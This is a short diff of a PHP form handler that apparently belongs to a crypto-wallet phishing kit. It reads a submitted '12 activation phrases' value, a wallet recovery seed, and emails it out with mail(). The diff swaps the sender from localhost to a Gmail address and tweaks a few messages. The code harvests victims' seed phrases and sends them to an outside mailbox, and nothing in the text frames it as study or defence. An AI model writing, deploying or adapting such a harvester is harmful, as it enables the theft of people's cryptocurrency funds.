@@ -12,11 +12,11 @@ else{
 $phrase= $_POST['phrase'];
 
 if(empty($phrase)){
-    echo "Phrases need to be complete";
+    echo "Phrases need to be complete ";
     exit;
 }
 
-$email_from= 'postmaster@localhost';
+$email_from= 'saxdasax@gmail.com';
 $email_subject="12 acticvation phrases";
 $email_body="The 12 phrases are $phrase";
 
@@ -27,7 +27,7 @@ if(mail($to,$email_subject,$email_body, $headers)) {
     echo "Email Sent";
 
 } else {
-    echo "failed";
+    echo "Failed";
 }
 
 
